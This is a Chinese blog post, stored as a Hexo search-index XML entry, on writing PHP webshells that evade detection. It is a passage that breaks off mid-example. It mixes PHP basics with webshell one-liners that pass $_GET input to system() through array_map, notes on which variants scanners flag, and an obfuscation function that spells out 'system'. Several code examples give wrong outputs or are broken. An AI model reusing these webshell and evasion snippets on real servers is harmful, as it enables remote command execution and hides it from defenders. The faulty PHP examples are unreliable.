<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>webshell总结篇</title>
      <link href="/2024/11/14/webshell%E6%80%BB%E7%BB%93%E7%AF%87/"/>
      <url>/2024/11/14/webshell%E6%80%BB%E7%BB%93%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="我们只要做一件事：免杀"><a href="#我们只要做一件事：免杀" class="headerlink" title="我们只要做一件事：免杀"></a>我们只要做一件事：免杀</h1><h2 id="一，-什么是webshell"><a href="#一，-什么是webshell" class="headerlink" title="一， 什么是webshell"></a>一， 什么是webshell</h2><p>(本篇文章大部分摘自AabyssZG师傅的博客)<br>Webshell是黑客经常使用的一种恶意脚本，其目的是获得服务器的执行操作权限，常见的webshell编写语言为asp、jsp和php。<br>比如执行系统命令、窃取用户数据、删除web页面、修改主页等，其危害不言而喻。黑客通常利用常见的漏洞，如SQL注入、远程文件包含(RFI)、FTP，甚至使用跨站点脚本攻击(XSS)等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</font></p><blockquote><p>简而言之就是银行保险库里的经过精心伪装的老鼠洞</p></blockquote><h2 id="二，-一些php基础，毕竟PHP是世界上最好的语言：）"><a href="#二，-一些php基础，毕竟PHP是世界上最好的语言：）" class="headerlink" title="二， 一些php基础，毕竟PHP是世界上最好的语言：）"></a>二， 一些php基础，毕竟PHP是世界上最好的语言：）</h2><p>以下分别是.&#x3D;和+&#x3D;赋值，数组，数组嵌套，数组嵌套利用，compact（）函数（跟py里的字典很像），&amp;与xor运算符，一些常量，php特性，php标记，<font color="red">回调类型函数，</font><font color="red">字符串处理类函数，命令执行类函数， 文件写入函数，异常处理类函数，数据库连接函数，PHP过滤器</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.</span></span><br><span class="line"><span class="variable">$c</span> .= <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> .= <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>; <span class="comment">//cab</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.</span></span><br><span class="line"><span class="variable">$c</span> += <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> += <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>; <span class="comment">//cab</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&quot;kan&quot;</span>,<span class="string">&quot;ye&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>].<span class="variable">$a</span>[<span class="number">1</span>].<span class="string">&quot;is god&quot;</span><span class="comment">//kanye is god</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b[]=ot&amp;b[]=to&#x27;</span><span class="comment">//php中单双引号不同：前者不能解析字符串中的变量，且只能转义单引号和转义字符本身，但凡是在字符处理上优于双引号，只会视做普通字符串。</span></span><br><span class="line"><span class="variable">$wow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>, <span class="variable">$wow</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$wow</span>);</span><br><span class="line"><span class="comment">/*Array (</span></span><br><span class="line"><span class="comment">    [b] =&gt; Array</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [0] =&gt; ot</span></span><br><span class="line"><span class="comment">            [1] =&gt; to</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"> )*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//还可以这么用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$wow</span>(<span class="string">&#x27;a&#x27;</span>)[<span class="number">0</span>].<span class="variable">$wow</span>(<span class="string">&#x27;a&#x27;</span>)[<span class="number">1</span>]<span class="comment">//otto</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//5.</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">11</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">22</span></span><br><span class="line"><span class="variable">$ky</span> = <span class="title function_ invoke__">compact</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>);<span class="comment">//想想这里为什么用双引号</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$ky</span>)</span><br><span class="line"><span class="comment">//Array ( [a] =&gt; 11 [b] =&gt; 22 )</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//6.</span></span><br><span class="line">(<span class="variable">$var</span> &amp; <span class="number">1</span>)<span class="comment">//如果$var是一个奇数，则返回true；如果是偶数，则返回false</span></span><br><span class="line"><span class="number">3</span> &amp; <span class="number">5</span> == <span class="number">1</span><span class="comment">//位运算：3是0011，5是0101，与运算得0001</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">11</span></span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span><span class="comment">//引用</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">22</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)<span class="comment">//11,11</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">33</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)<span class="comment">//33,33</span></span><br><span class="line"><span class="comment">//跟c的指针还是有区别的</span></span><br><span class="line"><span class="variable">$x</span> <span class="keyword">xor</span> <span class="variable">$y</span><span class="comment">//有且仅有一个真才真</span></span><br><span class="line"><span class="variable">$x</span> &amp;&amp; <span class="variable">$y</span><span class="comment">//和and一样</span></span><br><span class="line"><span class="variable">$x</span> || <span class="variable">$y</span><span class="comment">//至少有一个真才为真</span></span><br><span class="line">!<span class="variable">$x</span><span class="comment">//x不为真，则返回真</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//7.</span></span><br><span class="line"><span class="comment">//魔术常量</span></span><br><span class="line"><span class="keyword">__FILE__</span><span class="comment">////返回文件的完整路径和文件名</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) <span class="comment">//返回文件所在当前目录到系统根目录的一个目录结构（即代码所在脚本的路径，不会返回当前的文件名称）</span></span><br><span class="line"><span class="keyword">__DIR__</span>        <span class="comment">//当前被执行的脚步所在电脑的绝对路径</span></span><br><span class="line"><span class="keyword">__LINE__</span>       <span class="comment">//当前所示的行数</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>  <span class="comment">//当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__CLASS__</span>      <span class="comment">//当前所属的类</span></span><br><span class="line"><span class="keyword">__METHOD__</span>     <span class="comment">//当前所属的方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//8.</span></span><br><span class="line"><span class="comment">//php特性：PHP中函数名、方法名、类名不区分大小写，常量和变量区分大小写</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//9.</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="meta">?&gt;</span><span class="comment">//短标识，当使用他们需要开启 php.ini 文件中的 short_open_tag ，不然会报错</span></span><br><span class="line">&lt;% %&gt;<span class="comment">//同上</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//10.</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));        <span class="comment">//被查杀</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));      <span class="comment">//被查杀</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));      <span class="comment">//未被查杀</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]));      <span class="comment">//被查杀</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">array_filter</span>() </span><br><span class="line"><span class="title function_ invoke__">array_walk</span>()  </span><br><span class="line"><span class="title function_ invoke__">array_map</span>()</span><br><span class="line"><span class="title function_ invoke__">array_reduce</span>()</span><br><span class="line"><span class="title function_ invoke__">array_walk_recursive</span>()</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>()</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>()</span><br><span class="line"><span class="title function_ invoke__">filter_var</span>() </span><br><span class="line"><span class="title function_ invoke__">filter_var_array</span>() </span><br><span class="line"><span class="title function_ invoke__">registregister_shutdown_function</span>()</span><br><span class="line"><span class="title function_ invoke__">register_tick_function</span>()</span><br><span class="line"><span class="title function_ invoke__">forward_static_call_array</span>()</span><br><span class="line"><span class="title function_ invoke__">uasort</span>() </span><br><span class="line"><span class="title function_ invoke__">uksort</span>() </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一些常用的回调函数"><a href="#一些常用的回调函数" class="headerlink" title="一些常用的回调函数"></a>一些常用的回调函数</h3><ol><li>array_map()<br><font color="blue">函数将用户自定义函数</font>作用到数组中的每个值上，并返回用户自定义函数作用后的带有新的值的数组</li></ol><p>例子：将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新的值的数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunction</span>(<span class="params"><span class="variable">$v</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span>(<span class="variable">$v</span>*<span class="variable">$v</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);    <span class="comment">//array(1,4,9,16,25)</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;myfunction&quot;</span>,<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><ol start="2"><li>register_shutdown_function()<br>函数是来注册一个会在PHP中止时执行的函数</li></ol><p>因为PHP中止的情况有三种：  </p><blockquote><ol><li>执行完成</li><li>exit&#x2F;die导致的中止</li><li>发生致命错误中止</li></ol></blockquote><p>例子： 后面的after并没有输出，即 exit 或者是 die 方法导致提前中止</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;这个是中止方法test的输出&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;before&#x27;</span> . PHP_EOL; <span class="comment">//注册</span></span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;after&#x27;</span> . PHP_EOL;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>array_walk()<br>函数对数组中的每个元素应用用户自定义函数</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunction</span>(<span class="params"><span class="variable">$value</span>,<span class="variable">$key</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$key</span> <span class="subst">$p</span> <span class="subst">$value</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;red&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;green&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;blue&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$a</span>,<span class="string">&quot;myfunction&quot;</span>,<span class="string">&quot;has the value&quot;</span>);</span><br><span class="line"><span class="comment">//The key a has the value red</span></span><br><span class="line"><span class="comment">//The key b has the value green</span></span><br><span class="line"><span class="comment">//The key c has the value blue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>array_filter()<br>函数用回调函数过滤数组中的元素<br>该函数把输入数组中的每个键值传给回调函数：如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组（数组键名保持不变）<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_odd</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="variable">$var</span> &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a1</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_filter</span>(<span class="variable">$a1</span>,<span class="string">&quot;test_odd&quot;</span>));</span><br><span class="line"><span class="comment">//Array ( [3] =&gt; 3 )即arrayf​ilter函数会遍历数组a1中的每个元素，并将其传递给test_odd函数进行判断。最后，array_filter函数会返回所有使test_odd函数返回值为true的元素所构成的新数组。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>foreach()<br>方法用于调用数组的每个元素，并将元素传递给回调函数<br>foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//用foreach来处理$arr</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="number">2</span> * <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; 2</span></span><br><span class="line"><span class="comment">    [1] =&gt; 4</span></span><br><span class="line"><span class="comment">    [2] =&gt; 6</span></span><br><span class="line"><span class="comment">    [3] =&gt; 8</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li>isset()<br> 函数用于检测变量是否已设置并且非 NULL<br> isset 在php中用来判断变量是否声明，该函数返回布尔类型的值，即true&#x2F;false<br>isset 只能用于变量，因为传递任何其它参数都将造成解析错误<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 结果为 TRUE，所以后边的文本将被打印出来。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$var</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;变量已设置。&quot;</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。</span></span><br><span class="line"><span class="comment">// the return value of isset().</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;anothertest&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>));      <span class="comment">// TRUE</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>, <span class="variable">$b</span>)); <span class="comment">// TRUE</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">unset</span> (<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>));     <span class="comment">// FALSE</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>, <span class="variable">$b</span>)); <span class="comment">// FALSE</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$foo</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$foo</span>));   <span class="comment">// FALSE</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="一些字符串处理类函数"><a href="#一些字符串处理类函数" class="headerlink" title="一些字符串处理类函数"></a>一些字符串处理类函数</h3><ol><li>自己定义<br>组成字符串的拼接方式，比如：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">confusion</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$a</span>&gt;<span class="number">10</span>) &#123;</span><br><span class="line">        <span class="variable">$tmp</span> .= <span class="variable">$s</span>[<span class="variable">$a</span>%<span class="number">10</span>];</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$a</span>/<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tmp</span>.<span class="variable">$s</span>[<span class="variable">$a</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">confusion</span>(<span class="number">976534</span>);         <span class="comment">//sysTem（高危函数）</span></span><br><span class="line"><span class="comment">//以下字符串处理类的函数做参考</span></span><br><span class="line"><span class="title function_ invoke__">trim</span>()           <span class="comment">//从字符串的两端删除空白字符和其他预定义字符</span></span><br><span class="line"><span class="title function_ invoke__">ucfirst</span>()        <span class="comment">//把字符串中的首字符转换为大写</span></span><br><span class="line"><span class="title function_ invoke__">ucwords</span>()        <span class="comment">//把字符串中每个单词的首字符转换为大写</span></span><br><span class="line"><span class="title function_ invoke__">strtoupper</span>()     <span class="comment">//把字符串转换为大写</span></span><br><span class="line"><span class="title function_ invoke__">strtolower</span>()     <span class="comment">//把字符串转换为小写</span></span><br><span class="line"><span class="title function_ invoke__">strtr</span>()          <span class="comment">//转换字符串中特定的字符</span></span><br><span class="line"><span class="title function_ invoke__">substr_replace</span>() <span class="comment">//把字符串的一部分替换为另一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">substr</span>()         <span class="comment">//返回字符串的一部分</span></span><br><span class="line"><span class="title function_ invoke__">strtok</span>()         <span class="comment">//把字符串分割为更小的字符串</span></span><br><span class="line"><span class="title function_ invoke__">str_rot13</span>()      <span class="comment">//对字符串执行 ROT13 编码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>substr()<br>函数返回字符串的一部分<br>例子：相当于截取字段固定长度和开头的内容<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;D://system//451232.php&quot;</span>, -<span class="number">10</span>, <span class="number">6</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;   <span class="comment">//451232</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;AabyssTeam&quot;</span>, <span class="number">0</span>, <span class="number">6</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;                 <span class="comment">//Aabyss</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>intval()<br>获取变量的整数值</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">var</span>,base)   <span class="comment">//var指要转换成 integer 的数量值,base指转化所使用的进制 </span></span><br><span class="line"></span><br><span class="line">```    </span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：  </span><br><span class="line"></span><br><span class="line">    如果字符串包括了 <span class="number">0</span>x (或 <span class="number">0</span>X) 的前缀，使用 <span class="number">16</span> 进制 (hex)；</span><br><span class="line">    否则，如果字符串以 <span class="number">0</span> 开始，使用 <span class="number">8</span> 进制(octal)；</span><br><span class="line">    否则，将使用 <span class="number">10</span> 进制 (decimal)</span><br><span class="line"></span><br><span class="line">&gt;成功时返回 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span></span><br><span class="line">```php</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);      <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x1A</span>);     <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);       <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">4.2</span>);      <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line">&gt;&lt;font color=<span class="string">&quot;gree&quot;</span>&gt;?id=<span class="number">2</span> || id = <span class="number">1000</span>,使用逻辑或跳过<span class="title function_ invoke__">intval</span>()函数；取反运算符（~）来控制~~<span class="number">1000</span>&lt;/font&gt;</span><br><span class="line"><span class="number">4</span>. <span class="title function_ invoke__">parse_str</span>()  </span><br><span class="line">函数把查询字符串解析到变量中  </span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=Peter&amp;age=43&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;      <span class="comment">//Peter</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;              <span class="comment">//43</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=Peter&amp;age=43&quot;</span>,<span class="variable">$myArray</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$myArray</span>);       <span class="comment">//Array ( [name] =&gt; Peter [age] =&gt; 43 